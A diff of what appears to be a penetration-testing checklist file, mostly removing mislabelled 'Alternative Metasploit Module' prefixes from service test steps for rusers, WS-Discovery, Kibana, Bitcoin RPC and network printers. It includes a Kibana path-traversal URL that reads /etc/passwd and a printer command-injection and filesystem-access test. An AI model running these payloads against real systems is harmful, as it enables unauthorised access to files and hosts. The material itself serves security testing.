-      "Alternative Metasploit Module: auxiliary/scanner/misc/sunrpc_portmapper - Check detailed user info: `rusers -l target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/misc/sunrpc_portmapper - Enumerate through RPC: `rpcinfo -p target.com | grep rusersd`",
-      "Alternative Metasploit Module: auxiliary/scanner/misc/sunrpc_portmapper - Test for information disclosure",
-      "Alternative Metasploit Module: auxiliary/scanner/misc/sunrpc_portmapper - Look for system details in responses"
+      "Query users: `rusers target.com`",
+      "Check detailed user info: `rusers -l target.com`",
+      "Enumerate through RPC: `rpcinfo -p target.com | grep rusersd`",
+      "Test for information disclosure",
+      "Look for system details in responses"
     ],
     "tools": [
       "rusers",
@@ -2776,11 +2776,11 @@
       "Unauthenticated access"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/upnp/ssdp_msearch - Discover services: `nmap -p 3702 --script broadcast-ws-discovery target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/upnp/ssdp_msearch - Collect endpoint information",
-      "Alternative Metasploit Module: auxiliary/scanner/upnp/ssdp_msearch - Test for amplification DDoS potential",
-      "Alternative Metasploit Module: auxiliary/scanner/upnp/ssdp_msearch - Check for information leakage in responses",
-      "Alternative Metasploit Module: auxiliary/scanner/upnp/ssdp_msearch - Analyze device/service characteristics"
+      "Discover services: `nmap -p 3702 --script broadcast-ws-discovery target.com`",
+      "Collect endpoint information",
+      "Test for amplification DDoS potential",
+      "Check for information leakage in responses",
+      "Analyze device/service characteristics"
     ],
     "tools": [
       "ws-discovery",
@@ -2978,7 +2978,7 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/http/kibana_login - Access Kibana interface: `http://target.com:5601/`",
       "Alternative Metasploit Module: auxiliary/scanner/http/kibana_login - Check for unauthenticated access",
-      "Alternative Metasploit Module: auxiliary/scanner/http/kibana_login - Test for LFI: `http://target.com:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../etc/passwd`",
+      "Test for LFI: `http://target.com:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../etc/passwd`",
       "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - Enumerate Elasticsearch indices",
       "Alternative Metasploit Module: auxiliary/scanner/http/kibana_login - Check for outdated versions with known vulnerabilities"
     ],
@@ -3125,7 +3125,7 @@
       "Enumerate peers: `bitcoin-cli -rpcconnect=target.com getpeerinfo`",
       "Test RPC access: `curl --data-binary '{\"jsonrpc\":\"1.0\",\"method\":\"getnetworkinfo\",\"params\":[]},' http://user:pass@target.com:8333`",
       "Check for unauthenticated access",
-      "Alternative Metasploit Module: post/windows/gather/bitcoin_jacker - Test for information disclosure"
+      "Test for information disclosure"
     ],
     "tools": [
       "bitcoin-cli",
@@ -3210,7 +3210,7 @@
     "testing": [
       "Connect to printer: `nc target.com 9100`",
       "Send test page: `echo \"Hello World\" | nc target.com 9100`",
-      "Alternative Metasploit Module: auxiliary/server/capture/printjob_capture - Extract printer information: `pret target.com raw info`",
+      "Extract printer information: `pret target.com raw info`",
       "Test for command injection: `pret target.com raw cmd \"id\"`",
       "Attempt to access file system: `pret target.com raw fs ls`"
     ],
